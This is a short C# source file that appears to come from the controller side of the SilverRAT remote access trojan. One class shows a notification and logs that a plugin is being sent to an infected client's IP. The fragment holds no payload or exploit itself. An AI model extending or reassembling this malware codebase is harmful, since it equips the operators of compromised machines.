using SilverRAT.Connection;
using SilverRAT.Helper;
using SilverRAT.Properties;
using System.Drawing;

namespace SilverRAT.Handle_Packet;

public class HandleReportWindow
{
    public HandleReportWindow(Clients client, string title)
    {
        Notifiecation.Show("Info", "Sending the plugin to client " + client.Ip + " for the first time please wait..", Resources.InfoNotif, Color.FromArgb(52, 152, 219));
        new HandleLogs().Addmsg("Sending the plugin to client " + client.Ip + " for the first time please wait..", Color.FromArgb(52, 152, 219), Methods.Info);
    }
}
